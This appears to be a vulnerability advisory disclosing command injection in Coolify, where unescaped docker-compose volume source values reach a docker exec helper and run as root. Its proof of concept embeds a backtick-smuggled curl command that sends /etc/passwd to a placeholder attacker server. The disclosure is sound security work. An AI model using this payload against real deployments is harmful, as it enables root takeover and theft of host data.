### Summary
The following issue was identified using Aikido’s AI pentest service.

Parameters coming from docker-compose.yaml are not sanitized when used in commands. If a victim user creates an application from an attacker repository (using build pack "docker compose"), the attacker can execute commands on the Coolify instance as root.

### Details
The following function executes commands inside a docker container:
`bootstrap/helpers/docker.php:120`
```php
function executeInDocker(string $containerId, string $command)
{
    return "docker exec {$containerId} bash -c '{$command}'";
    // return "docker exec {$this->deployment_uuid} bash -c '{$command} |& tee -a /proc/1/fd/1; [ \$PIPESTATUS -eq 0 ] || exit \$PIPESTATUS'";
}
```

If the `$command` parameter is not properly escaped, we can break out `docker exec` and run commands on the Coolify host as root. Our AI Pentest service identified a possible injection via `docker-compose.yaml` parameters. After further investigation, we were able to confirm the `volumes['source']` parameter being vulnerable.

### PoC
1. Create an attacker repository including the following docker-compose.yaml payload:
```yaml
services:
  coolify:
    container_name: test
    image: alpine
    volumes:
      -
        type: bind
        source: '/tmp/pwn`curl https://<ATTACKER-SERVER-HERE> -X POST --data "$(cat /etc/passwd)"`'
        target: /app
    restart: always
    working_dir: /var/www/html
    extra_hosts:
      - 'host.docker.internal:host-gateway'
```
2. Notice the contents of `/etc/passwd` in the pingback to the attacker server

### Impact
Attackers can execute commands as root on the Coolify instance when a victim deploys an application based on the attacker repository (or if the attacker has low privilege access to Coolify).
